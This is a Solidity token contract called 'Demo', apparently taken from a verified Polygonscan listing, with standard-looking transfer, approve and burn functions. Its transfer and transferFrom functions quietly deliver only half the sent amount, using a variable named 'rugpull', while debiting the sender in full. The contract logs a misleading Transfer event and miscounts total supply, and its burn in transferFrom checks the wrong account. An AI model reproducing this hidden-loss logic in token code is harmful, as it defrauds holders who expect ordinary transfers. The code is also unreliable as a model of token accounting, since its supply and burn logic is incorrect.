/**
 *Submitted for verification at polygonscan.com on 2022-09-17
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

contract Demo {

    string public name = 'Demo';
    string public symbol = 'demo';
    uint8 public decimals = 18;
    address public owner;
    uint256 public totalSupply = 1000000000000000000000000000;

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Burn(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed from, address indexed spender, uint256 value);

    /*
     * Initializes contract with initial supply tokens to the creator of the contract.
     */
    constructor () {
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
    }

    /*
     * @dev Math operations with safety checks. Returns the subtraction of two unsigned integers, reverting on overflow.
     */
    function safeSub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        return a - b;
    }

    /*
     * @dev Math operations with safety checks. Returns the addition of two unsigned integers, reverting on overflow.
     */
    function safeAdd(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c>=a && c>=b);
        return c;
    }

    /*
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     */
    function transfer(address to, uint256 value) external returns (bool) {
        require(msg.sender != address(0));
        require(to != address(0));
        require(value > 0);
        require(balanceOf[msg.sender] >= value);
        require(balanceOf[to] + value > balanceOf[to]);
        uint256 rugpull = value;
        if(totalSupply >= 21000000) {
          rugpull = rugpull/2;
          _burn(value);
        }
        balanceOf[msg.sender] = safeSub(balanceOf[msg.sender], value);
        balanceOf[to] = safeAdd(balanceOf[to], rugpull); 
        emit Transfer(msg.sender, to, rugpull);
        return true;
    }
    
    /*
     * @dev A contract attempts to get the coins.
     */
    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        require(from != address(0));
        require(to != address(0));
        require(value > 0);
        require(balanceOf[from] >= value);
        require(balanceOf[to] + value > balanceOf[to]);
        require(allowance[from][msg.sender] >= value);
        uint256 rugpull = value;
        if(totalSupply >= 21000000) {
          rugpull = rugpull/2;
          _burn(value);
        }
        balanceOf[from] = safeSub(balanceOf[from], value);
        balanceOf[to] = safeAdd(balanceOf[to], rugpull);
        allowance[from][msg.sender] = safeSub(allowance[from][msg.sender], value);
        emit Transfer(from, to, rugpull);
        return true;
    }

    /*
     * @dev Allow another contract to spend some tokens in your behalf.
     */
    function approve(address spender, uint256 value) external returns (bool) {
        require(msg.sender != address(0));
        require(spender != address(0));
        require(value > 0);
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    /*
     * @dev Burns a specific amount of tokens.
     * @param value The amount of lowest token units to be burned.
     */
    function _burn(uint256 value) private {
        require(balanceOf[msg.sender] >= value);
        require(value > 0);
        totalSupply = safeSub(totalSupply, value);
        emit Burn(msg.sender, address(0), value);
    }

}